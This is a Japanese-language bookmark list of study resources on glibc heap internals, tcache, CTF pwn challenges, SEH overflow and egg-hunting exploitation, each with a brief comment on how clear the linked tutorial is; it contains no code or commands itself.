マジで神！free,malloc,unlink時の動作がコードでかいてある。   
  
https://www.valinux.co.jp/technologylibrary/document/linux/malloc0001/   
Heapの動作が日本語でわかりやすく書いてある。   
  
https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache/   
tcacheのWiki    
  
https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn    
Pwnの全体像がわかる。   

https://shift-crops.hatenablog.com/entry/2020/05/24/211147#ChildHeap-Pwn-473pt-7-solves   
ctf4bのchildheapの解説が神。わかりやすいし神。   

### SEH overflow
https://resources.infosecinstitute.com/seh-exploit/#gref   
Exploitの具体的な手順が書いてある。わかりやすい   
https://www.ffri.jp/assets/files/research/research_papers/SEH_Overwrite.pdf   
原理が書いてある。わかりやすい   
http://inaz2.hatenablog.com/entry/2015/07/13/011758   
原理が書いてある。わかりやすい   
https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/   
Exploitの手順が書いてある。これもわかりやすい   

### Egg-Hunting
https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/   
かなり詳細に書いてある。わかりやすい。   
https://resources.infosecinstitute.com/buffer-overflow-vulnserver/   
vulnserver.exeのEgg-HuntingのExploitが丁寧に書いてある。   


